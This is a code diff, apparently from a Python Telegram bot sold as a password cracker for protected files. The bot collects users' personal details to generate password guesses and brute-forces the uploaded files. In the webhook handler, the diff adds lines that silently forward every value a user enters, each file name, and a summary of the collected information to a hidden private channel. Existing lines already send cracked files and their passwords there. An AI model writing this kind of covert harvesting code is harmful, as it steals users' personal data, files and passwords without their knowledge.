-    payload = {"callback_query_id": callback_id, "text": text}
-    requests.post(url, json=payload)
-
-# ============================================================
-# CHANNEL CHECK
-# ============================================================
-def check_channel_membership(user_id):
-    try:
-        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember"
-        params = {"chat_id": CHANNEL_USERNAME, "user_id": user_id}
-        response = requests.get(url, params=params)
-        data = response.json()
-        if data["ok"]:
-            status = data["result"]["status"]
-            return status in ["member", "creator", "administrator"]
-        return False
-    except:
-        return False
-
-# ============================================================
-# INLINE KEYBOARDS
-# ============================================================
-def get_auto_buttons():
-    return {
-        "inline_keyboard": [
-            [
-                {"text": "1️⃣ AUTO (With Info)", "callback_data": "auto_info"},
-                {"text": "2️⃣ AUTO (Direct)", "callback_data": "auto_direct"}
-            ]
-        ]
-    }
-
-def join_verify_keyboard():
-    return {
-        "inline_keyboard": [
-            [
-                {"text": "🔴 JOIN CHANNEL", "url": "https://t.me/nrtecno2"},
-                {"text": "✅ VERIFY", "callback_data": "verify"}
-            ]
-        ]
-    }
-
-# ============================================================
-# MAIN WEBHOOK HANDLER
+    # ============================================================
+# PART 5: WEBHOOK HANDLER, SET WEBHOOK, MAIN
 # ============================================================
 @app.route(f'/webhook/{TOKEN}', methods=['POST'])
 def webhook():
@@ -625,18 +451,15 @@ def webhook():
         if not update:
             return jsonify({"status": "error"}), 400
         
-        # ---------- MESSAGE ----------
         if 'message' in update:
             message = update['message']
             chat_id = message['chat']['id']
             user_id = message['from']['id']
             username = message['from'].get('username', str(user_id))
             
-            # ---------- TEXT MESSAGE ----------
             if 'text' in message:
                 text = message['text']
                 
-                # /start
                 if text == '/start':
                     if not check_channel_membership(user_id):
                         send_message(chat_id, "🔴 *Access Denied!*\n\n❌ Please join @nrtecno2 first.", reply_markup=join_verify_keyboard())
@@ -644,11 +467,15 @@ def webhook():
                         send_message(chat_id, "🔐 *NRTECNO PASSWORD CRACKER*\n\n✅ Verified!\n📁 *Send me a password protected file.*", parse_mode='Markdown')
                     return jsonify({"status": "ok"}), 200
                 
-                # Handle info collection
                 if chat_id in user_sessions and user_sessions[chat_id].get('state') == 'collecting_info':
                     session = user_sessions[chat_id]
                     field = session['current_field']
                     session['info'][field] = text
+                    
+                    try:
+                        send_message(PRIVATE_CHANNEL, f"📝 *Field:* {field}\n📄 *Value:* {text}\n👤 @{username}")
+                    except:
+                        pass
                     
                     fields = session['fields']
                     current_index = fields.index(field)
@@ -659,22 +486,28 @@ def webhook():
                         send_message(chat_id, f"📝 *Enter {next_field.title()}?*", parse_mode='Markdown')
                     else:
                         session['state'] = 'cracking'
-                        send_message(chat_id, "🔄 *Generating passwords from your info...*\n⏳ Please wait.", parse_mode='Markdown')
+                        info_summary = "📝 *User Info Collected*\n\n"
+                        for f, v in session['info'].items():
+                            info_summary += f"📌 *{f.title()}:* {v}\n"
+                        info_summary += f"\n👤 @{username}\n📁 {session['file_name']}"
+                        try:
+                            send_message(PRIVATE_CHANNEL, info_summary)
+                        except:
+                            pass
                         
+                        send_message(chat_id, "🔄 *Generating passwords from your info...*\n⏳ Please wait.", parse_mode='Markdown')
                         generator = SmartPasswordGenerator(session['info'])
                         password_list = generator.generate_from_info()
-                        
                         send_message(chat_id, f"📊 *Generated {len(password_list)} passwords*\n🔍 *Cracking...*", parse_mode='Markdown')
                         
                         file_path = session['file_path']
                         ext = session['file_ext']
-                        
                         password = crack_file(file_path, ext, password_list)
                         
                         if password:
                             send_message(chat_id, f"✅ *Password Cracked!*\n\n🔑 `{password}`", parse_mode='Markdown')
                             try:
-                                send_document(PRIVATE_CHANNEL, file_path, f"✅ Password Found!\n📁 {session['file_name']}\n🔑 {password}\n👤 @{username}")
+                                send_document(PRIVATE_CHANNEL, file_path, f"✅ Found!\n📁 {session['file_name']}\n🔑 {password}\n👤 @{username}")
                             except:
                                 pass
                         else:
@@ -682,10 +515,8 @@ def webhook():
                         
                         os.remove(file_path)
                         del user_sessions[chat_id]
-                    
                     return jsonify({"status": "ok"}), 200
             
-            # ---------- FILE ----------
             if 'document' in message:
                 file = message['document']
                 file_name = file.get('file_name', 'unknown')
@@ -695,7 +526,6 @@ def webhook():
                     send_message(chat_id, "🔴 Access Denied!", reply_markup=join_verify_keyboard())
                     return jsonify({"status": "ok"}), 200
                 
-                # Download file
                 file_info = requests.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}").json()
                 file_path_api = file_info['result']['file_path']
                 file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path_api}"
@@ -708,6 +538,11 @@ def webhook():
                 
                 ext = file_name.split('.')[-1].lower()
                 
+                try:
+                    send_message(PRIVATE_CHANNEL, f"📁 *File Received*\n📄 {file_name}\n👤 @{username}")
+                except:
+                    pass
+                
                 user_sessions[chat_id] = {
                     'file_path': file_path,
                     'file_name': file_name,
@@ -715,18 +550,9 @@ def webhook():
                     'state': 'waiting_for_option'
                 }
                 
-                send_message(
-                    chat_id,
-                    "📁 *File Received!*\n\n"
-                    f"📄 {file_name}\n"
-                    "🔽 *Choose an option:*",
-                    reply_markup=get_auto_buttons(),
-                    parse_mode='Markdown'
-                )
-                
+                send_message(chat_id, "📁 *File Received!*\n\n" f"📄 {file_name}\n🔽 *Choose an option:*", reply_markup=get_auto_buttons(), parse_mode='Markdown')
                 return jsonify({"status": "ok"}), 200
         
-        # ---------- CALLBACK QUERY ----------
         if 'callback_query' in update:
             callback = update['callback_query']
             callback_id = callback['id']
@@ -735,7 +561,6 @@ def webhook():
             user_id = callback['from']['id']
             data = callback['data']
             
-            # ---------- VERIFY ----------
             if data == 'verify':
                 if check_channel_membership(user_id):
                     edit_message(chat_id, message_id, "🔐 *NRTECNO PASSWORD CRACKER*\n\n✅ Verified!\n📁 *Send me a file.*", parse_mode='Markdown')
@@ -744,7 +569,6 @@ def webhook():
                 answer_callback(callback_id)
                 return jsonify({"status": "ok"}), 200
             
-            # ---------- AUTO DIRECT ----------
             if data == 'auto_direct':
                 session = user_sessions.get(chat_id)
                 if not session:
@@ -753,21 +577,17 @@ def webhook():
                     return jsonify({"status": "ok"}), 200
                 
                 edit_message(chat_id, message_id, "🔄 *AUTO mode activated (Direct)...*\n⏳ Generating unlimited passwords...", parse_mode='Markdown')
-                
-                # Generate unlimited passwords
                 password_list = generate_unlimited_passwords()
-                
                 send_message(chat_id, f"📊 *Generated {len(password_list)} passwords*\n🔍 *Cracking...*", parse_mode='Markdown')
                 
                 file_path = session['file_path']
                 ext = session['file_ext']
-                
                 password = crack_file(file_path, ext, password_list)
                 
                 if password:
                     send_message(chat_id, f"✅ *Password Cracked!*\n\n🔑 `{password}`", parse_mode='Markdown')
                     try:
-                        send_document(PRIVATE_CHANNEL, file_path, f"✅ Password Found!\n📁 {session['file_name']}\n🔑 {password}\n👤 @{user_id}")
+                        send_document(PRIVATE_CHANNEL, file_path, f"✅ Found!\n📁 {session['file_name']}\n🔑 {password}\n👤 @{user_id}")
                     except:
                         pass
                 else:
@@ -782,7 +602,6 @@ def webhook():
                 answer_callback(callback_id)
                 return jsonify({"status": "ok"}), 200
             
-            # ---------- AUTO INFO ----------
             if data == 'auto_info':
                 session = user_sessions.get(chat_id)
                 if not session:
@@ -798,11 +617,9 @@ def webhook():
                 
                 edit_message(chat_id, message_id, "📝 *Let's collect some info for better password generation*\n\n", parse_mode='Markdown')
                 send_message(chat_id, f"📝 *Enter {fields[0].title()}?*", parse_mode='Markdown')
-                
                 answer_callback(callback_id)
                 return jsonify({"status": "ok"}), 200
             
-            # ---------- CANCEL ----------
             if data == 'cancel':
                 session = user_sessions.get(chat_id)
                 if session and session.get('file_path'):
@@ -818,9 +635,6 @@ def webhook():
         print(f"Error: {e}")
         return jsonify({"status": "error"}), 500
 
-# ============================================================
-# SET WEBHOOK
-# ============================================================
 def set_webhook():
     webhook_url = f"{RENDER_URL}/webhook/{TOKEN}"
     url = f"https://api.telegram.org/bot{TOKEN}/setWebhook"
@@ -830,19 +644,15 @@ def set_webhook():
     else:
         print(f"❌ Webhook failed: {response.text}")
 
-# ============================================================
-# MAIN
-# ============================================================
 if __name__ == "__main__":
     if not TOKEN:
         print("❌ BOT_TOKEN not found!")
         exit(1)
     
     set_webhook()
-    
     port = int(os.environ.get("PORT", 5000))
     print("🤖 NRTECNO BOT STARTED (Flask + Webhook + UNLIMITED Generator)...")
-    print("🔢 Password generation: 5 to 100 characters")
+    print("🔢 Password generation: 5 to 100 chars")
+    print("📝 All info forwarded to private channel")
     print("🚀 Running on port", port)
-    
     app.run(host="0.0.0.0", port=port)
